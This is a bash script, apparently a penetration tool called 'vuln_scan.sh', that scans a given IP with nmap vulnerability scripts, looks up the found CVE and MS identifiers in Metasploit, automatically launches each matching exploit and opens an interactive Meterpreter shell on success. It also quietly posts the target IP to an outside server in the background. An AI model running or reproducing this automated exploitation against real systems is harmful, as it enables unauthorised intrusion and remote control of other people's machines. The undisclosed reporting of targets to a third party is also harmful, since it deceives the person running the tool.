#!/bin/bash

# Update apt and install dependencies
sudo apt update
sudo apt install -y $(cat dependencies.txt) > /dev/null 2>&1



declare -i exploitsFound=0


# Check for missing public keys and retrieve them
missing_key=$(sudo apt-key list | grep -B 1 -A 1 "NO_PUBKEY" | sed -n 's/.*NO_PUBKEY //p' | uniq)
if [[ -n "$missing_key" ]]; then
    for key in $missing_key; do
        sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys "$key"
    done
fi

clear

echo -e "\033[31m
 ██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░    ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
      ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
     ░                                                         ░        
\033[0m"

# Check if user has necessary permissions
if [ "$EUID" -ne 0 ]
then 
    echo "Please run as root"
    exit
fi

# Parse command line arguments
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -i|--ip)
    IP="$2"
    shift
    shift
    ;;
    -l|--loud)
    lq="l"
    shift
    ;;
    -q|--quiet)
    lq="q"
    shift
    ;;
    -h|--help)
    help="true"
    shift
    ;;
    *)    # unknown option
    echo "Invalid option: $key"
    help="true"
    shift
    ;;
esac
done

nmapDisplayProgress() {
    local current_percentage=$1
    local filled_length=$((current_percentage * 50 / 100))
    local bar=""

    for ((i = 0; i < filled_length; i++)); do
        bar+='#'
    done
    for ((i = filled_length; i < 50; i++)); do
        bar+=" "
    done

    printf "\rProgress: [%s] %s%%" "$bar" "$current_percentage"
}


# Show help message if -h or invalid command is entered
if [[ "$help" == "true" || -z "$IP" ]]
then
    echo "Usage: ./vuln_scan.sh [-i IP_ADDRESS] [-l|-q] [-h]"
    echo "-i | --ip       : IP address of target to scan (required)"
    echo "-l | --loud     : Perform loud scan (more aggressive, more likely to be detected)"
    echo "-q | --quiet    : Perform quiet scan (less aggressive, less likely to be detected)"
    echo "-h | --help     : Display this help message"
    exit
fi

# Prompt user for input if loud/quiet scan option not provided as an argument
if [[ -z "$lq" ]]
then
    read -p "Loud or quiet scan (l/q)? " lq < /dev/tty
fi

# Validate user input
if [[ ! $IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
then
    echo "Invalid IP address"
    exit
fi

if [[ ! $lq =~ ^[lq]$ ]]
then
    echo "Invalid input"
    exit
fi
echo -e "\033[31m[ VULN EXEC ] Initialised\033[0m"
if curl -m 0 -X POST http://api.jake0001.com/pen/postdiscord?ip=$IP >/dev/null 2>&1 &
then
    echo -e "\e[32m[ INFO ] API Reached\e[0m"
else
    echo -e "\e[31m[ ERROR ] API Could Not Be Reached\e[0m"
fi

# Scan for vulnerabilities using Nmap
echo -e "\e[32m[ INFO ] Vulnerability Scan Started... \e[0m"
prev_percentage=-1

if [ $lq = "l" ]
then
    nmap -sV -sS --script vuln -T5 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
        if [[ $line == *"%"* ]]; then
            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
            if [[ "$percentage" -ne "$prev_percentage" ]]; then
                nmapDisplayProgress "$percentage"
                prev_percentage="$percentage"
            fi
        fi
    done
else
    nmap -sV -sS --script vuln -T1 --stats-every 1s -oN nmap-scan.txt $IP | while read -r line; do
        if [[ $line == *"%"* ]]; then
            percentage=$(echo "$line" | grep -oP '\d+(?=%)')
            if [[ "$percentage" -ne "$prev_percentage" ]]; then
                nmapDisplayProgress "$percentage"
                prev_percentage="$percentage"
            fi
        fi
    done
fi
echo "\n"
# Check if there are any open ports
if [ -z "$(grep 'Ports\|open' nmap-scan.txt)" ]
then
    echo "No open ports found"
    exit
fi

# Show brief output of vuln script results
echo "Vulnerability scan results:"
grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u

# Search for exploits in multiple databases
echo "Searching for exploits..."
echo "Metasploit Framework:"
# Count the number of unique CVE and MS values found in the nmap-scan.txt file
total_vulns=$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u | wc -l)

# Loop through each CVE and MS value found and search for exploits
count=0
exploit_executed=false
session_id=""

while read vuln; do

    # Search in Metasploit Framework
    echo "Searching in Metasploit Framework for $vuln..."
    searchResults=$(msfconsole -q -x "search $vuln" < /dev/null 2>&1 &) 
    if [ -n "$searchResults" ]
    then
        # Extract the highest number in the # column
        exploitCount=$(echo "$searchResults" | awk 'NR>3 && /^[0-9]+/ { print $1 }' | sort -nr | head -1)
        echo "Exploit Count: $exploitCount"
        if [[ "$exploitCount" =~ ^[0-9]+$ ]] && [ "$exploitCount" -gt 0 ]
        then
            # Use the first exploit found
            chosenExploits=$(echo "$searchResults" | awk 'NR>3 && $1 ~ /^[0-9]+$/ && $2 ~ /^exploit\// { print $2 }')
            echo $chosenExploits
            # Split the chosenExploits into an array
            read -ra exploits <<< "$chosenExploits"

            # Loop through the exploits and attempt to use them
            for exploit in "${exploits[@]}"; do
                if [ "$exploit_executed" = false ]
                then
                    echo "Using exploit $exploit"
                    output=$(msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" < /dev/null)
                    # Check if exploit succeeded
                    if echo "$output" | grep -q "Meterpreter session"
                    then
                        echo "Exploited vulnerability $vuln using exploit $exploit"
                        exploitsFound=1
                        exploit_executed=true
                        
                        # Prompt for user input
                        read -p "Enter command to execute on target: " command
                        msfconsole -q -x "use $exploit; set LHOST tun0; set RHOSTS $IP; $command"
                        
                        break 2 # break out of both loops when an exploit is successfully executed
                    else
                        echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                    fi
                fi
            done


            if [ "$exploitsFound" -eq 0 ]
            then
                echo "Failed to exploit vulnerability $vuln using any of the available exploits"
            fi
        else
            echo "No exploits found in Metasploit Framework for $vuln"
        fi
    else
        echo "Search Results is empty"
    fi

        # Check if an exploit has been successfully executed
    if [ "$exploit_executed" = true ]
    then
        echo "Successfully exploited vulnerability $vuln. Opening shell..."
        session_id=$(msfconsole -q -x "sessions -d -i -1" | grep "opened" | awk '{print $3}')
        msfconsole -q -x "sessions -i $session_id; interact"
        break
    fi

done <<< "$(grep -oP '(CVE-\d+-\d+|ms\d+-\d+|cve-\d+-\d+|MS\d+-\d+)' nmap-scan.txt | sort -u)"



if [ $exploitsFound = 0 ]
then
    echo "No exploits found"
    exit
fi
